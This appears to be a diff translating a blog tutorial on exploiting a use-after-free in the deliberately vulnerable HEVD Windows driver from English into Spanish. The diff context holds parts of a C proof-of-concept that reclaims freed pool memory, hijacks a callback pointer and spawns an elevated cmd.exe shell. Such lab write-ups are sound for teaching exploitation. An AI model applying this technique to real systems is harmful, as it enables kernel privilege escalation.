 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">173</span>     VOID
@@ -376,9 +378,9 @@
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">202</span> 
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">203</span>     <span style="color:#66d9ef">return</span> Status;
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">204</span> }
-</span></span></code></pre></div><p>Ok, so pretty straightforward. We&rsquo;re simply calling the <code>Callback</code> function pointer, which we previously saw was set in the <code>AllocateUaFObjectNonPagedPoolIoctlHandler()</code> to <code>UaFObjectCallbackNonPagedPool</code>.</p>
-<h2 id="understanding-freeuafobjectnonpagedpoolioctlhandler">Understanding FreeUaFObjectNonPagedPoolIoctlHandler</h2>
-<p>Once again we see that this handler takes no arguments.</p>
+</span></span></code></pre></div><p>No está tan mal, simplemente llamamos la función <code>Callback</code>, que vimos anteriormente estaba ambientado en el <code>AllocateUaFObjectNonPagedPoolIoctlHandler()</code> a <code>UaFObjectCallbackNonPagedPool</code>.</p>
+<h2 id="entender-el-freeuafobjectnonpagedpoolioctlhandler">Entender el FreeUaFObjectNonPagedPoolIoctlHandler</h2>
+<p>Una vez más vemos que este controlador no acepta argumentos:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">405</span> NTSTATUS
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">406</span> <span style="color:#a6e22e">FreeUaFObjectNonPagedPoolIoctlHandler</span>(
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">407</span>     _In_ PIRP Irp,
@@ -395,7 +397,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">418</span> 
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">419</span>     <span style="color:#66d9ef">return</span> Status;
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">420</span> }
-</span></span></code></pre></div><p>Lets look at <code>FreeUaFObjectNonPagedPool</code>:</p>
+</span></span></code></pre></div><p>Miremos <code>FreeUaFObjectNonPagedPool</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">211</span> NTSTATUS
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">212</span> <span style="color:#a6e22e">FreeUaFObjectNonPagedPool</span>(
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">213</span>     VOID
@@ -448,9 +450,9 @@
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">260</span>     
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">261</span>     <span style="color:#66d9ef">return</span> Status;
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">262</span> }
-</span></span></code></pre></div><p>Here we see a call to a new Windows API the <code>ExFreePoolWithTag</code> function. This function simply deallocates a block of pool memory allocated with the specified tag (Hack), however we can see that the global variable <code>g_UseAfterFreeObjectNonPagedPool</code> is never made NULL. This means <code>g_UseAfterFreeObjectNonPagedPool</code> will contain a pointer to the free&rsquo;d object even after it&rsquo;s been free&rsquo;d. As the source mentions - a dangling pointer.</p>
-<h2 id="understanding-allocatefakeobjectnonpagedpoolioctlhandler">Understanding AllocateFakeObjectNonPagedPoolIoctlHandler</h2>
-<p>Looking at this handler we can see it takes some user input on line <strong>441</strong>.</p>
+</span></span></code></pre></div><p>Aquí vemos una llamada a una nueva Windows API la función <code>ExFreePoolWithTag</code>. Esta función simplemente desasigna un bloque de memoria del grupo que se creó con un nombre específico (Hack), sin embargo podemos ver que la variable global <code>g_UseAfterFreeObjectNonPagedPool</code> nunca se hace NULL. Esto significa <code>g_UseAfterFreeObjectNonPagedPool</code> contendrá un puntero al objeto liberado incluso después de haber sido liberado - un dangling pointer.</p>
+<h2 id="entender-el-allocatefakeobjectnonpagedpoolioctlhandler">Entender el AllocateFakeObjectNonPagedPoolIoctlHandler</h2>
+<p>Al observar este controlador, vemos que requiere algunos argumentos del usuario en línea <strong>441</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">429</span> NTSTATUS
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">430</span> <span style="color:#a6e22e">AllocateFakeObjectNonPagedPoolIoctlHandler</span>(
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">431</span>     _In_ PIRP Irp,
@@ -472,7 +474,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">447</span>     
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">448</span>     <span style="color:#66d9ef">return</span> Status;
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">449</span> }
-</span></span></code></pre></div><p>From here, we call <code>AllocateFakeObjectNonPagedPool</code>.</p>
+</span></span></code></pre></div><p>De aquí, llamamos <code>AllocateFakeObjectNonPagedPool</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">270</span> NTSTATUS
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">271</span> <span style="color:#a6e22e">AllocateFakeObjectNonPagedPool</span>(
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">272</span>     _In_ PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject
@@ -552,21 +554,21 @@
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">346</span> 
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">347</span>     <span style="color:#66d9ef">return</span> Status;
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">348</span> }
-</span></span></code></pre></div><p>Let&rsquo;s break this down:</p>
+</span></span></code></pre></div><p>Analicemos esto:</p>
 <ul>
-<li>Lines 288-311 we allocate a chunk just as before, but this time it&rsquo;s a &ldquo;fake object&rdquo;. Just looking at the structure, it&rsquo;s the same size as the PUSE_AFTER_FREE_NON_PAGED_POOL object</li>
-<li>Lines 317-321 we see a new Windows API ProbeForRead which checks that the user-mode buffer is correctly aligned.</li>
-<li>Lines 327-331 we RtlCopyMemory / move the usermode buffer into the fake object allocation</li>
-<li>Lines 333-347 we NULL terminate the buffer and return.</li>
+<li>Líneas 288-311 creamos un pedazo de memoria como antes, pero esta vez es un &ldquo;objeto falso&rdquo;. Solo mirando la estructura, es del mismo tamaño que el objeto PUSE_AFTER_FREE_NON_PAGED_POOL</li>
+<li>Líneas 317-321 vemos un nuevo Windows API ProbeForRead que comprueba que el modo de usuario esté correctamente alineado.</li>
+<li>Líneas 327-331 nosotros RtlCopyMemory / movemos el búfer de modo de usuario a la sección falsa de memoria que se creó</li>
+<li>Líneas 333-347 nosotros finalizamos el buffer con NULL y regresamos.</li>
 </ul>
-<p>For reference this is the fake object:</p>
+<p>Como referencia, este es el objeto falso:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">68</span> <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _FAKE_OBJECT_NON_PAGED_POOL
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">69</span> {
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">70</span>     CHAR Buffer[<span style="color:#ae81ff">0x58</span>];
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">71</span> } FAKE_OBJECT_NON_PAGED_POOL, <span style="color:#f92672">*</span>PFAKE_OBJECT_NON_PAGED_POOL;
-</span></span></code></pre></div><p>Noice, if you&rsquo;re familiar with user mode exploitation your eyes are probably lit up by now.</p>
-<h1 id="summary-of-functions">Summary of Functions</h1>
-<p>In short this is what the functions do:</p>
+</span></span></code></pre></div><p>Si estás familiarizado con la exploitation de el modo de usuario, probablemente tus ojos se estan iluminando.</p>
+<h1 id="descripciones-de-funciones">Descripciones de Funciones</h1>
+<p>En corto esto es lo que hacen las funciones:</p>
 <table>
 <thead>
 <tr>
@@ -577,11 +579,11 @@
 <tbody>
 <tr>
 <td>AllocateUaFObjectNonPagedPoolIoctlHandler</td>
-<td>We&rsquo;re just allocating some memory (executable) to hold the <code>PUSE_AFTER_FREE_NON_PAGED_POOL</code> structure, fill the Buffer member (char array), and set the Callback member (function pointer)</td>
+<td>Solo estamos creando una región de memoria (ejecutable) para sostener la estructura <code>PUSE_AFTER_FREE_NON_PAGED_POOL</code>, llenando el miembro Buffer (char array), y estableciendo el miembro Callback</td>
 </tr>
 <tr>
 <td>UseUaFObjectNonPagedPoolIoctlHandler</td>
-<td>Calls the Callback function pointer from the global variable <code>g_UseAfterFreeObjectNonPagedPool</code></td>
+<td>Llama al puntero a la función Callback de el variable global <code>g_UseAfterFreeObjectNonPagedPool</code></td>
 </tr>
 <tr>
 <td>FreeUaFObjectNonPagedPoolIoctlHandler</td>
@@ -589,19 +591,19 @@
 </tr>
 <tr>
 <td>AllocateFakeObjectNonPagedPoolIoctlHandler</td>
-<td>Allocates an object the same size as the original allocation, but with user-controlled input.</td>
+<td>Crea una región de memoria para contener un objeto del mismo tamaño que la región de memoria original creada, pero con argumentos controlados por el usuario</td>
 </tr>
 </tbody>
 </table>
-<p>Looking at this we have a classic UAF. Never done a Windows UAF but I&rsquo;m assuming that the fake object will take the previously allocated memories space. To exploit this in theory all we need to do is:</p>
+<p>Viendo esto tenemos un clásico UAF. Nunca he hecho un Windows UAF pero supongo que el objeto falso ocupará el espacio creado anteriormente. Para hacer esto en teoría sólo necesitamos:</p>
 <ol>
-<li>Allocate a <code>USE_AFTER_FREE_NON_PAGED_POOL</code> object</li>
-<li>Free the object</li>
-<li>Allocate a <code>FAKE_OBJECT_NON_PAGED_POOL</code> object (reclaiming freed memory)</li>
-<li>Call <code>g_UseAfterFreeObjectNonPagedPool.Callback</code> which should point to the corrupted structure</li>
+<li>Crear un objeto <code>USE_AFTER_FREE_NON_PAGED_POOL</code></li>
+<li>Libera el objeto</li>
+<li>Crear un objeto <code>FAKE_OBJECT_NON_PAGED_POOL</code> (recuperando la memoria que fue liberada)</li>
+<li>Llamar <code>g_UseAfterFreeObjectNonPagedPool.Callback</code> que debería apuntar a la estructura corrupta</li>
 </ol>
-<h1 id="exploitation">Exploitation</h1>
-<p>From here writing a PoC seemed pretty straightforward, and since we had source this should be pretty easy (object size wise).</p>
+<h1 id="explotación">Explotación</h1>
+<p>Desde aquí escribiendo un PoC parecía fácil, y dado que tuvimos acceso al código:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
@@ -688,15 +690,15 @@
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering UAF</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, HEVD_CALL_FPTR, NULL, <span style="color:#ae81ff">0</span>);
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Once sent, we can see we have successfully hijacked execution flow.</p>
+</span></span></code></pre></div><p>Una vez enviado, podemos ver que hemos ganado control sobre el flujo de ejecución.</p>
 <p><img src="/0x02-Introduction-to-Windows-Kernel-Use-After-Frees/uaf_success.png" alt="alt text"></p>
-<p>Now since we see <strong>41414141</strong> we can assume that the first 4 bytes are the function pointer, we can confirm this based on the source code (UseAfterFreeNonPagedPool.h):</p>
+<p>Vemos <strong>41414141</strong> entonces podemos asumir que los primeros 4 bytes son el puntero a la función, podemos confirmar esto basándonos en el código dentro (UseAfterFreeNonPagedPool.h):</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">62</span> <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _USE_AFTER_FREE_NON_PAGED_POOL
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">63</span> {
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">64</span>     FunctionPointer Callback;
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">65</span>     CHAR Buffer[<span style="color:#ae81ff">0x54</span>];
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">66</span> } USE_AFTER_FREE_NON_PAGED_POOL, <span style="color:#f92672">*</span>PUSE_AFTER_FREE_NON_PAGED_POOL;
-</span></span></code></pre></div><p>Let&rsquo;s write our exploit!</p>
+</span></span></code></pre></div><p>Escribamos nuestro exploit!</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
@@ -827,11 +829,11 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>);
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Once compiled:</p>
+</span></span></code></pre></div><p>Una vez compilado:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>i686<span style="color:#f92672">-</span>w64<span style="color:#f92672">-</span>mingw32<span style="color:#f92672">-</span>gcc poc.c <span style="color:#f92672">-</span>o poc.exe
-</span></span></code></pre></div><p>We get our shell!</p>
+</span></span></code></pre></div><p>Nos da acceso!</p>
 <p><img src="/0x02-Introduction-to-Windows-Kernel-Use-After-Frees/poc.gif" alt="alt text"></p>
-<h1 id="sources">Sources</h1>
+<h1 id="recursos">Recursos</h1>
 <pre tabindex="0"><code>https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/paged_code
 </code></pre>
     </div>
